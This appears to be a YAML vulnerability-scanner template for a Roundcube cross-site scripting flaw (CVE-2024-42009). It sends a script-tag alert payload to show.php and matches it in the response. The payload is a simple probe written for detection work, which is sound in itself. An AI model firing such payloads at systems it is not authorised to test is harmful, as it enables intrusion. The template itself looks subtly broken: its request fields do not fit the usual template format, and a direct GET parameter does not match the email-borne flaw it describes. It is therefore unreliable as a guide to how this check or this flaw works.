id: cve-2024-42009

info:
  name: CVE-2024-42009 - Roundcube Cross-Site Scripting (XSS)
  author: 3p1c0w3nd
  severity: medium
  description: |
    A Cross-Site Scripting vulnerability in Roundcube through 1.5.7 and 1.6.x through 1.6.7 allows a remote attacker to steal and send emails of a victim via a crafted e-mail message that abuses a Desanitization issue in message_body() in program/actions/mail/show.php.
  tags: cve, xss, roundcube

requests:
  - method: GET
    path:
      - "{{BaseURL}}/program/actions/mail/show.php"
    headers:
      Host: "{{Hostname}}"
    params:
      - message_body: "{{Payload}}"
    payloads:
      - payloads:
        - '<script>alert("XSS")</script>'
    matchers:
      - type: word
        words:
          - '<script>alert("XSS")</script>'
        part: body
    extractors:
      - type: regex
        name: xss_test
        regex: '<script>alert\("XSS"\)</script>'
